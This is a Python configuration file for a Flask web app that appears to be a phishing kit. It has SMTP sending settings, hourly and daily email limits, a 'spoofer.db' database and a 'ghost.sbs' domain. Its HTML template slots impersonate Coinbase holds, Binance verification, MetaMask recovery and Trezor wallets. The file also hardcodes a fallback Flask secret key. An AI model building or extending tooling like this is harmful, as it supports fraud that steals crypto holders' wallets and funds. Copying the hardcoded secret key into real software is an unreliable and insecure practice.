import os
from dotenv import load_dotenv
from pathlib import Path
from datetime import timedelta

# Load environment variables from .env file in the project root
env_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '.env')
load_dotenv(env_path)


# SMTP Configuration
SMTP_CONFIG = {
    "server": os.getenv('SMTP_SERVER', 'localhost'),
    "port": int(os.getenv('SMTP_PORT', '587')),
    "username": os.getenv('SMTP_USERNAME', ''),
    "password": os.getenv('SMTP_PASSWORD', '')
}

# File Paths
PROJECT_ROOT = Path(__file__).resolve().parent.parent
LOG_FILE_PATH = PROJECT_ROOT / 'logs' / 'email_log.txt'
EMAIL_COUNT_FILE = PROJECT_ROOT / 'data' / 'email_counts.json'

# HTML Templates
HTML_TEMPLATES = {
    'coinbase_hold': os.getenv('COINBASE_TEMPLATE', ''),
    'binance_verify': os.getenv('BINANCE_TEMPLATE', ''),
    'metamask_recovery': os.getenv('METAMASK_TEMPLATE', ''),
    'trezor_wallet': os.getenv('TREZOR_TEMPLATE', '')
}


# Email Limits
MAX_EMAILS_PER_HOUR = int(os.getenv('MAX_EMAILS_PER_HOUR', '10'))
MAX_EMAILS_PER_DAY = int(os.getenv('MAX_EMAILS_PER_DAY', '50'))

# Domain Configuration
DOMAIN = os.getenv('DOMAIN')  # Your Namecheap domain
DOMAIN_SCHEME = os.getenv('DOMAIN_SCHEME', 'http')

# Database Configuration
SQLALCHEMY_DATABASE_URI = os.getenv('DATABASE_URL', 'sqlite:///spoofer.db')
SQLALCHEMY_TRACK_MODIFICATIONS = False

class Config:
    # Flask Configuration
    SECRET_KEY = os.getenv('SECRET_KEY') or 'e04ace37fd2f049884adf1ccf304c5fbdc1b2dd86326662d211626b1f48e74bf'
    WTF_CSRF_SECRET_KEY = SECRET_KEY
    
    # Domain Configuration
    SERVER_NAME = os.getenv('DOMAIN', 'ghost.sbs')  # Your domain
    PREFERRED_URL_SCHEME = os.getenv('DOMAIN_SCHEME', 'https')  # Use HTTPS by default
    
    # Database Configuration
    SQLALCHEMY_DATABASE_URI = SQLALCHEMY_DATABASE_URI
    SQLALCHEMY_TRACK_MODIFICATIONS = SQLALCHEMY_TRACK_MODIFICATIONS
    
    # Session Configuration
    SESSION_TYPE = 'filesystem'
    PERMANENT_SESSION_LIFETIME = timedelta(days=7)
    SESSION_COOKIE_SECURE = False
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = 'Lax'
    SESSION_COOKIE_DOMAIN = None
    
    # Application Configuration
    APPLICATION_ROOT = '/'
    USE_X_SENDFILE = False
    PREFERRED_URL_SCHEME = 'http'
    JSON_AS_ASCII = False
    JSON_SORT_KEYS = False
    JSONIFY_PRETTYPRINT_REGULAR = False
    
    # Security Configuration
    WTF_CSRF_ENABLED = True
    WTF_CSRF_CHECK_DEFAULT = True
    WTF_CSRF_TIME_LIMIT = None
    
    # Email Limits
    MAX_EMAILS_PER_HOUR = MAX_EMAILS_PER_HOUR
    MAX_EMAILS_PER_DAY = MAX_EMAILS_PER_DAY

    # Security Headers
    STRICT_TRANSPORT_SECURITY = True
    STRICT_TRANSPORT_SECURITY_PRELOAD = True
    STRICT_TRANSPORT_SECURITY_MAX_AGE = 31536000  # 1 year
    STRICT_TRANSPORT_SECURITY_INCLUDE_SUBDOMAINS = True

def update_email_limits(per_hour=None, per_day=None):
    global MAX_EMAILS_PER_HOUR, MAX_EMAILS_PER_DAY
    if per_hour is not None:
        MAX_EMAILS_PER_HOUR = per_hour
        Config.MAX_EMAILS_PER_HOUR = per_hour
    if per_day is not None:
        MAX_EMAILS_PER_DAY = per_day
        Config.MAX_EMAILS_PER_DAY = per_day 